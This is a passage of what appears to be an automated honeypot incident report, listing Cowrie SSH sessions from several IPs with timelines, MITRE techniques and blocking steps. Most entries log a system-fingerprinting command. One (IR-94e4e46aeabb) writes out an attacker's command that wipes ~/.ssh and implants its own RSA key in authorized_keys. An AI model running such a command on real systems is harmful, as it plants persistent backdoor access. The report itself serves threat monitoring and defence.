| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.success` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.command.input` |
| `2026-07-22 20:00:29` | `cowrie.log.closed` |
| `2026-07-22 20:00:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4e1a8176c5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:02 |
| **Last Seen** | 2026-07-22 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:02:18` | `cowrie.session.connect` |
| `2026-07-22 20:02:18` | `cowrie.client.version` |
| `2026-07-22 20:02:18` | `cowrie.client.kex` |
| `2026-07-22 20:02:19` | `cowrie.login.success` |
| `2026-07-22 20:02:20` | `cowrie.session.params` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.success` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.command.input` |
| `2026-07-22 20:02:20` | `cowrie.log.closed` |
| `2026-07-22 20:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee1d13e39c96

| Field | Detail |
|---|---|
| **Source IP** | `93.177.157[.]179` |
| **First Seen** | 2026-07-22 20:02 |
| **Last Seen** | 2026-07-22 20:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:02:41` | `cowrie.session.connect` |
| `2026-07-22 20:02:41` | `cowrie.client.version` |
| `2026-07-22 20:02:41` | `cowrie.client.kex` |
| `2026-07-22 20:02:42` | `cowrie.login.success` |
| `2026-07-22 20:02:42` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.177.157[.]179` to AbuseIPDB if not already reported
- [ ] Block `93.177.157[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5afad9d6f708

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-07-22 20:02 |
| **Last Seen** | 2026-07-22 20:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:02:52` | `cowrie.session.connect` |
| `2026-07-22 20:02:52` | `cowrie.client.version` |
| `2026-07-22 20:02:52` | `cowrie.client.kex` |
| `2026-07-22 20:02:54` | `cowrie.login.success` |
| `2026-07-22 20:02:55` | `cowrie.direct-tcpip.request` |
| `2026-07-22 20:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f47d13693b2a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:04 |
| **Last Seen** | 2026-07-22 20:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:04:06` | `cowrie.session.connect` |
| `2026-07-22 20:04:06` | `cowrie.client.version` |
| `2026-07-22 20:04:07` | `cowrie.client.kex` |
| `2026-07-22 20:04:07` | `cowrie.login.success` |
| `2026-07-22 20:04:08` | `cowrie.session.params` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.success` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:08` | `cowrie.command.input` |
| `2026-07-22 20:04:09` | `cowrie.log.closed` |
| `2026-07-22 20:04:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94e4e46aeabb

| Field | Detail |
|---|---|
| **Source IP** | `188.66.127[.]172` |
| **First Seen** | 2026-07-22 20:04 |
| **Last Seen** | 2026-07-22 20:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:04:23` | `cowrie.session.connect` |
| `2026-07-22 20:04:23` | `cowrie.client.version` |
| `2026-07-22 20:04:23` | `cowrie.client.kex` |
| `2026-07-22 20:04:24` | `cowrie.login.success` |
| `2026-07-22 20:04:24` | `cowrie.session.params` |
| `2026-07-22 20:04:24` | `cowrie.command.input` |
| `2026-07-22 20:04:24` | `cowrie.command.failed` |
| `2026-07-22 20:04:25` | `cowrie.log.closed` |
| `2026-07-22 20:04:25` | `cowrie.session.params` |
| `2026-07-22 20:04:25` | `cowrie.command.input` |
| `2026-07-22 20:04:25` | `cowrie.session.file_download` |
| `2026-07-22 20:04:25` | `cowrie.log.closed` |
| `2026-07-22 20:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.66.127[.]172` to AbuseIPDB if not already reported
- [ ] Block `188.66.127[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7a3497ec77

| Field | Detail |
|---|---|
| **Source IP** | `188.66.127[.]172` |
| **First Seen** | 2026-07-22 20:04 |
| **Last Seen** | 2026-07-22 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:04:26` | `cowrie.session.connect` |
| `2026-07-22 20:04:26` | `cowrie.client.version` |
| `2026-07-22 20:04:26` | `cowrie.client.kex` |
| `2026-07-22 20:04:26` | `cowrie.login.success` |
| `2026-07-22 20:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.66.127[.]172` to AbuseIPDB if not already reported
- [ ] Block `188.66.127[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154c92f586b8

| Field | Detail |
|---|---|
| **Source IP** | `188.66.127[.]172` |
| **First Seen** | 2026-07-22 20:04 |
| **Last Seen** | 2026-07-22 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:04:26` | `cowrie.session.connect` |
| `2026-07-22 20:04:26` | `cowrie.client.version` |
| `2026-07-22 20:04:26` | `cowrie.client.kex` |
| `2026-07-22 20:04:27` | `cowrie.login.success` |
| `2026-07-22 20:04:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.66.127[.]172` to AbuseIPDB if not already reported
- [ ] Block `188.66.127[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f7d2276676

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:05 |
| **Last Seen** | 2026-07-22 20:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:05:50` | `cowrie.session.connect` |
| `2026-07-22 20:05:50` | `cowrie.client.version` |
| `2026-07-22 20:05:50` | `cowrie.client.kex` |
| `2026-07-22 20:05:51` | `cowrie.login.success` |
| `2026-07-22 20:05:52` | `cowrie.session.params` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.success` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:52` | `cowrie.command.input` |
| `2026-07-22 20:05:53` | `cowrie.log.closed` |
| `2026-07-22 20:05:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ea46d7a49ec

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:07 |
| **Last Seen** | 2026-07-22 20:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:07:33` | `cowrie.session.connect` |
| `2026-07-22 20:07:33` | `cowrie.client.version` |
| `2026-07-22 20:07:33` | `cowrie.client.kex` |
| `2026-07-22 20:07:34` | `cowrie.login.success` |
| `2026-07-22 20:07:36` | `cowrie.session.params` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.success` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.command.input` |
| `2026-07-22 20:07:36` | `cowrie.log.closed` |
| `2026-07-22 20:07:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-622ac631f528

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:09 |
| **Last Seen** | 2026-07-22 20:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:09:14` | `cowrie.session.connect` |
| `2026-07-22 20:09:14` | `cowrie.client.version` |
| `2026-07-22 20:09:14` | `cowrie.client.kex` |
| `2026-07-22 20:09:15` | `cowrie.login.success` |
| `2026-07-22 20:09:16` | `cowrie.session.params` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.success` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:16` | `cowrie.command.input` |
| `2026-07-22 20:09:17` | `cowrie.log.closed` |
| `2026-07-22 20:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c4fb92d58da

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-22 20:10 |
| **Last Seen** | 2026-07-22 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:10:07` | `cowrie.session.connect` |
| `2026-07-22 20:10:07` | `cowrie.client.version` |
| `2026-07-22 20:10:07` | `cowrie.client.kex` |
| `2026-07-22 20:10:08` | `cowrie.login.success` |
| `2026-07-22 20:10:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adbe170d556

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-22 20:10 |
| **Last Seen** | 2026-07-22 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:10:09` | `cowrie.session.connect` |
| `2026-07-22 20:10:09` | `cowrie.client.version` |
| `2026-07-22 20:10:09` | `cowrie.client.kex` |
| `2026-07-22 20:10:09` | `cowrie.login.success` |
| `2026-07-22 20:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdfb7aef2211

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-22 20:10 |
| **Last Seen** | 2026-07-22 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:10:13` | `cowrie.session.connect` |
| `2026-07-22 20:10:13` | `cowrie.client.version` |
| `2026-07-22 20:10:13` | `cowrie.client.kex` |
| `2026-07-22 20:10:13` | `cowrie.login.success` |
| `2026-07-22 20:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ff23d952ec8

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-22 20:10 |
| **Last Seen** | 2026-07-22 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:10:14` | `cowrie.session.connect` |
| `2026-07-22 20:10:14` | `cowrie.client.version` |
| `2026-07-22 20:10:14` | `cowrie.client.kex` |
| `2026-07-22 20:10:14` | `cowrie.login.success` |
| `2026-07-22 20:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a7c675f328

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:10 |
| **Last Seen** | 2026-07-22 20:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:10:57` | `cowrie.session.connect` |
| `2026-07-22 20:10:57` | `cowrie.client.version` |
| `2026-07-22 20:10:57` | `cowrie.client.kex` |
| `2026-07-22 20:10:58` | `cowrie.login.success` |
| `2026-07-22 20:10:59` | `cowrie.session.params` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.success` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:10:59` | `cowrie.command.input` |
| `2026-07-22 20:11:00` | `cowrie.log.closed` |
| `2026-07-22 20:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21e39f547df8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:12 |
| **Last Seen** | 2026-07-22 20:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:12:39` | `cowrie.session.connect` |
| `2026-07-22 20:12:40` | `cowrie.client.version` |
| `2026-07-22 20:12:40` | `cowrie.client.kex` |
| `2026-07-22 20:12:41` | `cowrie.login.success` |
| `2026-07-22 20:12:42` | `cowrie.session.params` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.success` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.command.input` |
| `2026-07-22 20:12:42` | `cowrie.log.closed` |
| `2026-07-22 20:12:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7323fe7024d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-22 20:14 |
| **Last Seen** | 2026-07-22 20:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 20:14:20` | `cowrie.session.connect` |
| `2026-07-22 20:14:20` | `cowrie.client.version` |
| `2026-07-22 20:14:20` | `cowrie.client.kex` |
| `2026-07-22 20:14:22` | `cowrie.login.success` |
